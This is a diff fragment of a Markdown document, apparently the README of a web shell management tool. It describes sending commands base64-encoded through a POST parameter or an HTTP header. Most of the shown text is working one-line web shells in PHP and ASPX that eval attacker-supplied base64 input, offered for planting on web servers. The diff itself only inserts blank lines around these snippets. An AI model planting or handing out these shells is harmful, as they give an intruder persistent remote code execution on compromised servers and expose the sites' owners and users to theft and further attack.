@@ -169,10 +169,12 @@ Requests and Responses are delivered in clear text using HTTP POST
 Requests and Response are delivered using base64 encoded commands.  Results are delivered base64 encoded.
 
 ```php
+
 <?php @eval(base64_decode($_POST['password']));?>
 ```
 
  ```aspx
+ 
  <%@ Page Language="Jscript"%><%eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["password"])),"unsafe");%>
 
  ```
@@ -183,11 +185,13 @@ Requests and Response are delivered using a base64 encoded HTTP Header.  Results
 
 
 ```php
+
 <?php @eval(base64_decode($_SERVER['HTTP_PSESSION']));?>
 
 ```
 
 ```aspx
+
  <%@ Page Language="Jscript"%><%eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Headers["password"])),"unsafe");%>
 ```
 
